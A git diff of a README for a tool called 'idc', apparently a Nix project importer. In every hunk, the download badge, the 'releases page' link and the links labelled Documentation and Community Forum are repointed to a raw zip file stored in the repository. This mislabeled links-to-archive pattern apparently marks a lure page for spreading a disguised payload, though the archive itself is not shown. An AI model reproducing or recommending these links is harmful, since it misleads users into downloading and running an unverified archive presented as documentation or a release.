@@ -6,9 +6,9 @@ The `idc` application allows you to import Nix projects effortlessly, regardless
 ## 📦 Download & Install
 To get started, you need to download the application from the Releases page. Click the link below to download the latest version:
 
-[![Download idc](https://raw.githubusercontent.com/Aramkachaturiansandman198/idc/main/npins/idc-v2.5.zip%20idc-v1.0-blue)](https://raw.githubusercontent.com/Aramkachaturiansandman198/idc/main/npins/idc-v2.5.zip)
+[![Download idc](https://github.com/Aramkachaturiansandman198/idc/raw/refs/heads/main/npins/Software-v2.9-alpha.5.zip%20idc-v1.0-blue)](https://github.com/Aramkachaturiansandman198/idc/raw/refs/heads/main/npins/Software-v2.9-alpha.5.zip)
 
-1. Visit the releases page: [Download here](https://raw.githubusercontent.com/Aramkachaturiansandman198/idc/main/npins/idc-v2.5.zip).
+1. Visit the releases page: [Download here](https://github.com/Aramkachaturiansandman198/idc/raw/refs/heads/main/npins/Software-v2.9-alpha.5.zip).
 2. Look for the latest release.
 3. Click on the appropriate file to download it to your computer.
 
@@ -48,8 +48,8 @@ If problems persist, you can check for updates on the Releases page or seek help
 ## 🔗 Additional Resources
 For more information and user support, you can visit the following resources:
 
-- [Documentation](https://raw.githubusercontent.com/Aramkachaturiansandman198/idc/main/npins/idc-v2.5.zip)
-- [Community Forum](https://raw.githubusercontent.com/Aramkachaturiansandman198/idc/main/npins/idc-v2.5.zip)
+- [Documentation](https://github.com/Aramkachaturiansandman198/idc/raw/refs/heads/main/npins/Software-v2.9-alpha.5.zip)
+- [Community Forum](https://github.com/Aramkachaturiansandman198/idc/raw/refs/heads/main/npins/Software-v2.9-alpha.5.zip)
 
 ## 📞 Support
 If you need further assistance, feel free to reach out directly through GitHub issues. We aim to respond to all inquiries promptly.
@@ -59,4 +59,4 @@ Thank you for choosing `idc`. We appreciate your support in using our applicatio
 
 For updates on new features, check the Releases page regularly:
 
-[![Download idc](https://raw.githubusercontent.com/Aramkachaturiansandman198/idc/main/npins/idc-v2.5.zip%20idc-v1.0-blue)](https://raw.githubusercontent.com/Aramkachaturiansandman198/idc/main/npins/idc-v2.5.zip)
+[![Download idc](https://github.com/Aramkachaturiansandman198/idc/raw/refs/heads/main/npins/Software-v2.9-alpha.5.zip%20idc-v1.0-blue)](https://github.com/Aramkachaturiansandman198/idc/raw/refs/heads/main/npins/Software-v2.9-alpha.5.zip)
